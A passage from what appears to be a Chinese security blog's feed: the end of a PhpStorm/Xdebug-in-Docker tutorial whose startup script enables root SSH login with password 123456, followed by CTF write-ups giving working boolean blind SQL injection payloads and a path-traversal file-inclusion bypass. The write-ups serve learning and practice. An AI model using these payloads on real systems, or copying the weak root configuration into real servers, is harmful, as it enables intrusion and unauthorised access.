php文件上打上断点，点击 右上角 甲壳虫样式的 Debug按钮。即可成功断点</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><br><h1 id="调试方式二-ssh-隧道"><a href="#调试方式二-ssh-隧道" class="headerlink" title="调试方式二 - ssh 隧道"></a>调试方式二 - ssh 隧道</h1><p>这种方式不仅仅可以用在 <strong>Docker 环境</strong> 上，同样可以用在 <strong>远程服务器</strong> 上。缺点就是要在 container 里头安装许多额外服务。</p><br><h2 id="配置Dockerfile"><a href="#配置Dockerfile" class="headerlink" title="配置Dockerfile"></a>配置Dockerfile</h2><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>这里做测试使用前文的 Dockerfile，需要按照实际情况进行配置添加。</p><p>修改前文的 Dockerfile。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">基础 image 为 php:7.3-apache</span></span><br><span class="line">FROM php:7.3-apache</span><br><span class="line"></span><br><span class="line">ENV APACHE_DOCUMENT_ROOT /var/www/html</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 ssh 服务</span></span><br><span class="line">RUN apt-get update &amp;&amp; \</span><br><span class="line">apt-get install ssh -y</span><br><span class="line"><span class="meta">#</span><span class="bash">安装 xdebug 扩展 并开启</span></span><br><span class="line">RUN pecl install xdebug &amp;&amp; \</span><br><span class="line">docker-php-ext-enable xdebug</span><br><span class="line"><span class="meta">#</span><span class="bash">将宿主机的 phpinfo.php 拷贝到 container /var/www/html/phpinfo.php 中</span></span><br><span class="line">COPY ./phpinfo.php /var/www/html/phpinfo.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> !!! 使用一个启动脚本来完成流程 3 4 5 的工作 !!!</span></span><br><span class="line">COPY ./start.sh /start.sh</span><br><span class="line">RUN chmod +x /start.sh</span><br><span class="line">CMD [&quot;/start.sh&quot;]</span><br></pre></td></tr></table></figure><p>start.sh 内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash">设置 ssh 允许 root 登录</span></span><br><span class="line">echo &#x27;PermitRootLogin yes&#x27; &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="meta">#</span><span class="bash">修改root密码</span></span><br><span class="line">echo root:123456 | chpasswd</span><br><span class="line"><span class="meta">#</span><span class="bash">配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line">echo &quot;xdebug.client_host = host.docker.internal&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.client_port = 9003&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.mode = debug&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.max_nesting_level = 1000&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line">echo &quot;xdebug.discover_client_host = true&quot; &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="meta">#</span><span class="bash">重启 apache ssh</span></span><br><span class="line">service apache2 restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="meta">#</span><span class="bash">要加上这个，不然 container 运行完就停止了。</span></span><br><span class="line">sleep infinity</span><br></pre></td></tr></table></figure><p>重建 image：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">最好先删掉之前的再重建</span></span><br><span class="line">docker image rm IMAGE值 -f</span><br><span class="line">docker build -t test/testmyphp .</span><br></pre></td></tr></table></figure><p>启动 container：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -p 81:80 -p 2222:22 test/testmyphp</span><br></pre></td></tr></table></figure><p>至此，调试环境所需要的服务就安装好了，接下来配置 PHPSTORM。</p><br><h2 id="配置-PHPSTORM-1"><a href="#配置-PHPSTORM-1" class="headerlink" title="配置 PHPSTORM"></a>配置 PHPSTORM</h2><p>打开 PHPSTORM，新建一个 Project。选择 <em>New Project from Existing Files</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/1.png" width="500px"><p>选择 <em>Web server is on remote host</em>。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/2.png" width="500px"><p>一路 <em>Next</em>。走到配置 <em>Remote Server</em></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/3.png" width="500px"><p>然后又是一路 <em>Next</em> 即可。</p><p>配置完成后，将能看到我们的项目。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/4.png" width="500px"><p>此时是不能直接进行代码调试的。我们要做以下工作</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run/Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><em>ps：由于有些步骤是一样的，就直接拉上文的截图过来了。</em></p><p><strong>配置 CLI Interpreter</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em>。设置 CLI Interpreter</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/5.png" width="500px"><p>新建一个 <em>CLI Interpreter</em>。选择 <em>From Docker, Vagrant, VM, WSL,Remote….</em></p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/6.png" width="500px"><p>设置 PHP executable 路径。不知道可以进入 container 中使用 <code>whereis php</code> 进行搜索</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/7.png" width="500px"><p><strong>配置 目录映射</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers</em>。配置目录映射</p><p>注意一定要把 <em>Use path mappings</em> 的勾勾上，才能配置目录映射</p><p><em>Absolute path on the server</em>  是要手动打上服务器路径的</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/8.png" width="500px"><p><strong>设置Xdebug端口</strong></p><p>进入 <em>File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP</em> -&gt; Debug。设置 <em>Xdebug Debug port</em> 为 9003。和 php 配置一致。</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/9.png" width="500px"><p><strong>配置一个 Run/Debug Configuration</strong></p><p>点击 PHPSTORM 右上角的 *Add Configuration….*。进入配置面，新增一个 PHP Web Page。并进行如下简单的配置即可（改名字设url 路径）</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/10.png" width="500px"><p><strong>启动 PHP Debug Listening</strong></p><p>直接点击 PHPSTROM 右上角的 <em>小电话</em> ，即可开启监听</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/11.png" width="500px"><p><strong>验证</strong></p><p>在 php文件上打上断点，点击 右上角 甲壳虫样式的 Debug按钮。即可成功断点</p><img src="/2021/03/17/2021-03-17-phpstorm-docker/12.png" width="500px"><p><strong>扩展 - 远程服务器调试</strong></p><p>这里可以扩展以一下，如果调试目标是远程服务器而不是本地 Docker，该如何配置？</p><p>其实和上面的步骤一样的，只是 Xdebug 监听的流量我们要做修改下。</p><p><strong>简单说说 Xdebug 监听的原理：</strong></p><p>当 php-xdebug 接收到带有 XDEBUG_SESSION_START 的请求时，将会把当前的 Debug信 息发送给 xdebug 中配置的 client_host 和 cilent_port。</p><p>在我们的 start.sh 启动文件中，设置如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xdebug.client_host = host.docker.internal</span><br><span class="line">xdebug.client_port = 9003</span><br></pre></td></tr></table></figure><p><code>host.docker.internal</code> 值在 Xdebug 中是自动将请求端的 ip 设置为 调试端，即自动将 Debug信息 发送给任何请求IP。</p><p>而 <code>xdebug.client_port</code> 的值是 Debug信息 被发送至的端口。</p><br><p>我们可以想下，在本地，xdebug端是能访问到到我们请求端的 ip 和 端口 的，因为都是同一局域网。</p><p>但若调试的是远程服务器，由于公网和内网的原因，公网服务器是无法发送 Debug信息 调试端的（除非调试端也在公网上。。）</p><br><p>所以我们需要将 <code>xdebug.client_host</code> 设置为 <code>127.0.0.1</code>，让 xdebug 转发 Debug信息 到本地的 9003 端口中。</p><p>接着使用 ssh 隧道进行端口转发，把调试端监听的 9003 端口映射到 服务端的 9003 上。这样就能接收到 xdebug 转发的 Debug信息了。这一点使用 ssh 隧道是可以做到的。</p><br><p>我们来测试下，首先修改 php.ini。让 <code>xdebug.client_host</code> 值为 <code>127.0.0.1</code></p><img src="/2021/03/17/2021-03-17-phpstorm-docker/13.png" width="500px"><p>进行 ssh隧道端口转发</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -R 远程IP:远程端口:127.0.0.1:9003 root@远程IP</span><br></pre></td></tr></table></figure><p>这样就能使用调试远程程序了。</p><br><h1 id="Reference："><a href="#Reference：" class="headerlink" title="Reference："></a>Reference：</h1><p><a href="https://docs.docker.com/engine/reference/builder/">https://docs.docker.com/engine/reference/builder/</a></p><p><a href="https://hub.docker.com/_/php">https://hub.docker.com/_/php</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文首发在 Freebuf。但好像排版没那么好看 233.。。。于是想博客也发一份对照看看，个人感觉还是我这里的排版好看点哈哈哈&lt;/p&gt;</summary>
    
    
    
    <category term="Docker" scheme="http://example.com/categories/Docker/"/>
    
    
    <category term="Docker" scheme="http://example.com/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[2] - [VNCTF2021] WEB realezjvav &amp;&amp; Ez_game</title>
    <link href="http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/"/>
    <id>http://example.com/2021/03/15/2021-03-14-VNCTF2021-log/</id>
    <published>2021-03-15T02:01:08.000Z</published>
    <updated>2021-03-24T14:50:55.983Z</updated>
    
    <content type="html"><![CDATA[<p>简单记录下第二次参加CTF。。虽然还是做不出来题。。。</p><p>这篇文章主要就是想分享下 Mysql if 的一个小技巧。增加一个布尔注入的小姿势。</p><span id="more"></span><br><h1 id="Web-realezjvav"><a href="#Web-realezjvav" class="headerlink" title="Web - realezjvav"></a>Web - realezjvav</h1><p>本来看到 java 没打算看的，可是出题人说这个并没有考到多少 java 知识。便去瞄了下。此题需要两步才能得解。我只做出了第一步。。。第一步是 SQL布尔注入，第二步虽然没做出来，但是估计是 fastjson 的 RCE</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/1.png" style="width:500px;"><p>通过测试得知，<code>password</code> 存在 SQL 注入</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456&#x27;</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=123456</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br></pre></td></tr></table></figure><br><p>在经过一番尝试，发现当字段中存在 <code>union</code> 或者 <code>sleep</code> 时，会将整个 <code>password</code> 的值清空再带入到 SQL语句中。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; union select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; select#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; select#&#x27;</span><br><span class="line"></span><br><span class="line">==================</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and sleep(3)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">username=admin&amp;password=&#x27; and select(1)#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br><span class="line">[根据前后响应，判断此时的 SQL 语句在执行是应该是:]</span><br><span class="line">select * from table where username=&#x27;admin&#x27; and password = &#x27;&#x27; and select(1)#&#x27;</span><br></pre></td></tr></table></figure><br><p>并且值得注意的是，不管万能密码是否奏效， and 和 or 怎么混着用，页面返回都是一样的，我们只能根据状态码来判断 SQL语句是否生效。</p><p>这里有两种思路:</p><ol><li><p>无回显的 SQL 注入，那么我们可以使用 DNSLOG 来创造回显。可惜这里的 load_file() 没法正常使用。 load_file() 无法制造 DNSLOG 的原因一般为两个l：<code>Linux环境</code>或 <code>secure_filr_priv=NULL</code></p></li><li><p>既然需要根据状态码来判断SQL语句执行状态，我们就得设法让 SQL 语句报错。这里就涉及到一个 <em>Mysql</em> <code>if</code> 的小技巧</p></li></ol><p>在 Mysql 中，<code>if</code> 的基本用法如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(表达式, 表达式为<span class="literal">True</span>执行的语句, 表达式为<span class="literal">False</span>执行的语句);</span><br></pre></td></tr></table></figure><p>简单使用:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">1</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if((<span class="keyword">select</span> <span class="number">0</span>) ,<span class="number">1</span> , <span class="number">0</span>);</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">0</span></span><br></pre></td></tr></table></figure><p>值得注意的是，当表达式返回 True 时，是不会执行 <code>if</code> 的第三个参数的。同理，当表达式返回 False 时，也不会执行 <code>if</code> 的第二个参数。</p><p>并且 if 的参数只接受一行值，如果执行的子查询返回了多行值，将会报错。</p><p>综上所述，我们可以构造这样的 POC</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">1</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line"><span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> if( (<span class="keyword">select</span> <span class="number">0</span>), <span class="number">1</span>, (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> mysql.user) );</span><br><span class="line">[OUTPUT:]</span><br><span class="line">ERROR <span class="number">1242</span> (<span class="number">21000</span>): Subquery <span class="keyword">returns</span> more than <span class="number">1</span> <span class="type">row</span></span><br></pre></td></tr></table></figure><br><p>明白这种性质之后，我们就可以使用这个性质来进行基于 <strong>HTTP code</strong> 的<strong>布尔盲注</strong>了</p><p><strong>Poc:</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 1), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 200</span><br><span class="line"></span><br><span class="line">[PAYLOAD:]</span><br><span class="line">&#x27; or if( (select 0), 1, (select 1 from mysql.user) )#</span><br><span class="line">[OUTPUT:]</span><br><span class="line">HTTP/1.1 500</span><br></pre></td></tr></table></figure><br><p>结合 substr() 和 limit 注表名:</p><p><span style="color:red">注意:如果想扔到 burp 里跑十六进制的表名。注意十六进制是 0-9,a-f 而不是单单的 0-9。我这里就被坑了一下。。。</span></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[PAYLOAD:]</span><br><span class="line"><span class="string">&#x27; or </span></span><br><span class="line"><span class="string">if( </span></span><br><span class="line"><span class="string">(select </span></span><br><span class="line"><span class="string">substr(</span></span><br><span class="line"><span class="string">(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1)</span></span><br><span class="line"><span class="string">,1,1 )</span></span><br><span class="line"><span class="string">) = 0x55</span></span><br><span class="line"><span class="string">, 1, (select 1 from mysql.user) </span></span><br><span class="line"><span class="string">)#</span></span><br></pre></td></tr></table></figure><p>最后爆出密码登陆后台，发现里面的功能传输格式是 json 格式，猜测可能是 fastjson的漏洞。可惜没怎么了解，遂没有继续下去。</p><br><h1 id="Web-Ez-game"><a href="#Web-Ez-game" class="headerlink" title="Web - Ez_game"></a>Web - Ez_game</h1><p>一开就是个游戏，提示通关有 FLAG</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/2.png" style="width:500px;"><p>瞄了一下网络请求，没有与后端交互的请求。估计都是 js 写的。</p><p>查看首页HTML源码，发现注释写着一共有十关</p><p>找到一个 js 文件 game.js 。里面似乎都是些人物的属性。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PlayerData</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">// track player data between levels (when player is destroyed)</span></span><br><span class="line">    <span class="title">constructor</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">this</span>.health = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.healthMax = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">this</span>.boomerangs = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">this</span>.bigBoomerangs = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">this</span>.coins = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>尝试直接在 console 控制台处修改人物属性。发现了一个 <em>player</em> 对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Player </span><br><span class="line">......</span><br><span class="line">health: <span class="number">3</span></span><br><span class="line">healthMax: <span class="number">3</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>尝试修改这些属性</p><img src="/2021/03/15/2021-03-14-VNCTF2021-log/3.png" style="width:500px;"><p>发现我们变强力了。</p><p>玩一玩这个游戏，玩到第三关的时候，发现死亡后重生时可以进入之前存档的一关。</p><p>在 js 中找到疑似 存档关卡的一个值 <code>localStorage.kbap_warp</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">NextLevel</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    <span class="comment">// track highest level reached</span></span><br><span class="line">    <span class="keyword">if</span> (!speedRunMode &amp;&amp; levelNumber&gt;warpLevel)</span><br><span class="line">        warpLevel = levelNumber;</span><br><span class="line">    <span class="built_in">localStorage</span>.kbap_warp = warpLevel;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先径直来到第三关，然后设置 <code>localStorage.kbap_warp</code> 为 10，这样我们死亡后去进入存档，就可以直接打 boss 战了。</p><p>来到 boss 战把自己的属性修改强力，很轻松就斩杀 Boss</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;简单记录下第二次参加CTF。。虽然还是做不出来题。。。&lt;/p&gt;
&lt;p&gt;这篇文章主要就是想分享下 Mysql if 的一个小技巧。增加一个布尔注入的小姿势。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    <category term="WEB" scheme="http://example.com/categories/CTF/WEB/"/>
    
    
    <category term="Mysql" scheme="http://example.com/tags/Mysql/"/>
    
    <category term="Javascript" scheme="http://example.com/tags/Javascript/"/>
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF玩耍系列[1] - [HCTF 2018]WarmUp | [极客大挑战 2019]PHP | [MRCTF2020]你传你🐎呢</title>
    <link href="http://example.com/2021/03/13/2021-03-13-buuctf-1/"/>
    <id>http://example.com/2021/03/13/2021-03-13-buuctf-1/</id>
    <published>2021-03-13T03:50:45.000Z</published>
    <updated>2021-03-15T01:51:23.735Z</updated>
    
    <content type="html"><![CDATA[<p>周末玩了玩CTF，做个小记录</p><p>平台地址：</p><p><a href="https://buuoj.cn/">https://buuoj.cn/</a></p><span id="more"></span><br><h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>访问靶机，只发现一滑稽.</p><p>查看网页源码，发现注释写着 <code>source.php</code>。遂访问之。得到一个 <code>highlight_file</code> 的 php 源码</p><p>代码可以阉割成如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//白名单</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// $page 必须是字符串，不能传入数组</span></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//字符串切割，只保留 ? 前面的部分</span></span><br><span class="line">    <span class="comment">//注意，这里切割之后的值是保存在 $_page 中，并不是修改了 $page。所以原来的 $_REQUEST[&#x27;file&#x27;] 并没有改变</span></span><br><span class="line">    <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//判读 $_Ppage 是否在白名单中</span></span><br><span class="line">    <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">    <span class="comment">//文件包含</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由于白名单中提示了一个 <code>hint.php</code> 。访问之。提示:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag not here, and flag in ffffllllaaaagggg</span><br></pre></td></tr></table></figure><br><p>综合以上的分析，我们得知虽然在 <code>checkFile()</code> 函数中，会对 <code>$_REQUEST[&#39;file&#39;]</code> 进行截取，保留 <code>?</code>符号 前面的部分存入  <code>$_page</code> 中。但是最后 inlucde 的还是原始的 <code>$_REQUEST[&#39;file&#39;]</code>。</p><br><p>绕过 PAYLOAD:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=source.php?/../hint.php</span><br></pre></td></tr></table></figure><p><code>source.php</code> 后面紧跟着 <code>?</code> 号。确保在 <code>checkFile()</code> 中能够返回 true。</p><p><code>source.php</code> 和 <code>?/</code> 一起组合成了 <code>source.php?/</code>。php 将会将其当作一个目录名，即使这个目录不存在。接着使用 <code>../</code> 跳出目录，包含 <code>hint.php</code> 以验证 payload。</p><br><p>实验证明，上述 payload 确实有效。</p><p>获取 flag 的姿势也是一样的，就改个文件名和路径而已。 需要注意的是flag 在 Linux 根目录下而不是和 Web 同级。</p><br><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>访问靶机，发现提示 <em>备份网站</em>。遂开 burp 跑字典</p><p>推荐下 key师傅 的字典。这里跑的字典用的是 <em>Dir/Ctf.txt</em></p><p><a 